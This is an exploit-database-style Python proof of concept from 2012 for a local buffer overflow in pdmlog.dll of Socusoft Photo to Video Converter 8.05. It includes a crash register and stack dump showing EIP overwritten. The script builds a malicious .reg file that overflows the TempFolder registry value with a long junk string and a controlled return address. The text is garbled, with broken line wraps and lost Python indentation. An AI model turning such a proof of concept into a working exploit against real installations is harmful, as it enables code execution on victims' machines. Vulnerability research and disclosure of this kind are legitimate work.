#!/usr/bin/python
# Exploit Title: Socusoft Photo to Video Converter Free/Pro v8.05 #
(pdmlog.dll) Local Buffer Overflow PoC #  Version: 8.05 #  Date: 
2012-02-26 #  Author: Julien Ahrens #  Homepage: 
http://www.inshell.net #  Software Link: http://www.socusoft.com #  
Tested on: Windows XP SP3 Professional German #  Notes: Overflow 
occurs in pdmlog.dll #  Howto: Import Reg -> Start App
#  EAX 42424242
#  EBX 00360000 pdmlog.dll:00360000
#  ECX 0036BF3B pdmlog.dll:pdmlog_5+A66B #  EDX 80284006 #  ESI 
00000002 #  EDI 00000000 #  EBP 01C5FC0C Stack[000001AC]:01C5FC0C #  
ESP 01C5FBF0 Stack[000001AC]:01C5FBF0 #  EIP 42424242 #  EFL 
00010206
#  01C5FBE0 00000000
#  01C5FBE4 00000002
#  01C5FBE8 000094B7
#  01C5FBEC 00000001
#  01C5FBF0 0036BF6F pdmlog.dll:pdmlog_5+A69F <- Crash #  01C5FBF4 
00360000 pdmlog.dll:00360000 #  01C5FBF8 00000002 #  01C5FBFC 
00000000 #  01C5FC00 00000000 #  01C5FC04 01C5FC20 
Stack[000001AC]:01C5FC20 #  01C5FC08 7FFDE000 debug066:7FFDE000
file="poc.reg" 
junk1="\x41" * 548
boom="\x42\x42\x42\x42"
junk2="\x43" * 100
poc="Windows Registry Editor Version 5.00\n\n"
poc=poc + "[HKEY_CURRENT_USER\Software\Socusoft Photo to Video  
Converter Free Version\General]\n"
poc=poc + "\"TempFolder\"=\"" + junk1 + boom + junk2 + "\""
try:
print "[*] Creating exploit file...\n";  writeFile = open (file, "w")  writeFile.write( poc)
writeFile.close()
print "[*] File successfully created!";
except:
print "[!] Error while creating file!";
